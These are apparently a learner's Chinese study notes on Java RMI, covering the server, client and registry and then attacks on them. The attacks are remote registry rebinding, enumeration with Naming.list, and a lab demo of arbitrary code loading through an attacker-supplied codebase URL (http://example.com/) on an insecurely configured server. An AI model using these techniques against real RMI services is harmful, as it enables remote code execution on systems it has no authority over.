### RMI基本介绍

#### RMI的基本组成

RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独 有的⼀种机制。

* RMI Server 服务端

* RMI Client 客户端

* RMI Register RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。

#### RMI Server

Server由三部分构成：

*  ⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()

```java
package com.individuals.RMIServer;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteHelloWorld extends Remote {
    public String hello() throws RemoteException;
}

```

* ⼀个实现了此接⼝的类

```java
package com.individuals.RMIServer;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteHelloWorld extends UnicastRemoteObject implements
        IRemoteHelloWorld {
    protected RemoteHelloWorld() throws RemoteException {
        super();
    }
    public String hello() throws RemoteException {
        System.out.println("call from");
        return "Hello world666666";
    }
}
```

* ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了

```java
package com.individuals.RMIServer;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {

    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
    }
    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}

```

#### RMI Client

客户端较为简单，但是有两点需要注意：

* 使用了继承了 java.rmi.Remote 的接⼝
* 使用Naming.lookup进行查找

```java
package com.individuals.RMIClient;

import com.individuals.RMIServer.IRemoteHelloWorld;
import java.rmi.Naming;
public class TrainMain {
    public static void main(String[] args) throws Exception {
        IRemoteHelloWorld hello = (IRemoteHelloWorld)
                Naming.lookup("rmi://192.168.201.109:1099/Hello");
        String ret = hello.hello();
        System.out.println(ret);
        System.out.println("over!");
    }
}

```

#### RMI Client和Server的通信

通信的细节不重要，这里只要知道Client会和Server进行两次TCP连接，第一次是连接到1099端口的Register，Register返回一个序列化的远程对象，之后Client再根据这个远程对象再次发起TCP连接，Server此时才真正执行Client调用的远程方法。

#### RMI Register

* Register再刚刚的例子中，存在感不强，因为通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分

```java
LocateRegistry.createRegistry(1099);
Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
```

* 如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099 

 ```java
 LocateRegistry.createRegistry(1099);
 Naming.rebind("Hello", h);
 ```

### 对RMI的攻击

#### 控制RMI Register绑定恶意类（实际不可行）

```java
package com.individuals.RMIClient;


import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteBindRMI {
    public interface IRemoteHelloWorld extends Remote {
        public String hello() throws RemoteException;
    }
    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld {
        public RemoteHelloWorld() throws RemoteException {
            super();
        }
        public String hello() throws RemoteException {
            System.out.println("call from");
            return "Hello world666666";
        }
    }
    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        // 与之前的server不同，没有 LocateRegistry.createRegistry(1099); 这说明没有在本地开启Register
        // 下面的bind操作是尝试控制远程的Register绑定
        Naming.rebind("rmi://192.168.201.109:1099/Hello2", h);
    }
    public static void main(String[] args) throws Exception {
        new RemoteBindRMI().start();
    }
}

```

* 运行这段代码，如果Naming.rebind("rmi://192.168.201.109:1099/Hello2", h);的uri
  * 指向的是本地开启的register，则可以成功运行，而且Hello2被成功注册了
  * 指向的是远程开启的register，则报错，提示`类加载器禁用：异常中的“no security manager: RMI class loader disabled”意味着没有安装安全管理器（`SecurityManager`），导致 RMI 类加载器被禁用。RMI 依赖类加载器来加载网络上的类定义。`这与java安全漫谈中的描述不同，漫谈给出的异常是禁止对远端的register使用bind、unbind、rebind方法。而且在本机测试，uri指向一个不存在register的ip时，也不会报漫谈中的错误，而是连接不成功。（这里的本机采用jdk1.8，server和register运行在本机中，虚拟机中采用jdk17，不排除是jdk版本不一致的问题。）

#### 较为简单的攻击方法

* 无法对远程的register进行bind、unbind、rebind等操作，但可以进行list和lookup（lookup前文已经给出过）等操作，这样一来，如果目标register本身绑定了一些危险操作，就可以利用其进行lookup进行调用。下面给出list的示例代码

```java
package com.individuals.RMIClient;

import java.rmi.Naming;

public class RemoteListRMI {
    private String[] start() throws Exception {
        return Naming.list("rmi://192.168.201.109:1099");
    }
    public static void main(String[] args) throws Exception {
        String[] list = new RemoteListRMI().start();
        for(String s : list){
            System.out.println(s);
        }
    }
}

```

* 一个参考项目https://github.com/NickstaDB/BaRMIe，探测利用RMI服务器的恶意服务

#### RMI利用codebase执行任意代码

* codebase类似于CLASSPATH，告诉JVM到哪去搜索类，但是codebase往往是远程URL例如http、ftp等
* RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。
* 在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。但是这样的利用方式存在很大限制，要求：
  * 安装并配置了SecurityManager
  * Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false（配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取）



服务器端代码

```java
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;
public interface ICalc extends Remote {
    public Integer sum(List<Integer> params) throws RemoteException;
}
```

```java
import java.rmi.RemoteException;
import java.util.List;
import java.rmi.server.UnicastRemoteObject;
public class Calc extends UnicastRemoteObject implements ICalc {
    public Calc() throws RemoteException {}
    public Integer sum(List<Integer> params) throws RemoteException {
        Integer sum = 0;
        for (Integer param : params) {
            sum += param;
        }
        return sum;
    }
}

```

```java
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
public class RemoteRMIServer {
    private void start() throws Exception {
        if (System.getSecurityManager() == null) {
            System.out.println("setup SecurityManager");
            System.setSecurityManager(new SecurityManager());
        }
        Calc h = new Calc();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("refObj", h);
    }
    public static void main(String[] args) throws Exception {
        new RemoteRMIServer().start();
    }
}
```

```txt
grant {
    permission java.security.AllPermission;
};
```



* 运行的额外参数：-Djava.rmi.server.hostname=192.168.201.109 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy="server.policy"
  * -Djava.rmi.server.hostname=192.168.201.109 这是服务端的IP，需要显示设置
  * -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy="D:/Java/demo/javaSecurity/RMIStudy/src/main/resources/RMIServer/server.policy" 使得可以从客户端传递的codebase中加载类

客户端代码

```java
import java.io.Serializable;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;

public class RMIClient implements Serializable {
    public interface ICalc extends Remote {
        public Integer sum(List<Integer> params) throws RemoteException;
    }
    public class Payload extends ArrayList<Integer> {}
    public void lookup() throws Exception {
        ICalc r = (ICalc)
                Naming.lookup("rmi://192.168.201.109:1099/refObj");
        List<Integer> li = new Payload();
        li.add(3);
        li.add(4);
        // r.sum(li)是在服务端执行的，但是li的类Payload在服务端没有定义，需要服务端通过codebase加载
        System.out.println(r.sum(li));
    }
    public static void main(String[] args) throws Exception {
        if (System.getSecurityManager() == null) {
            System.setSecurityManager(new SecurityManager());
        }
        new RMIClient().lookup();
    }
}

```

* 运行命令的额外参数： -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/  -Djava.security.manager -Djava.security.policy="client.policy"
  * -Djava.rmi.server.codebase=http://example.com/  是为服务端提供的，在该url下放入.class即可
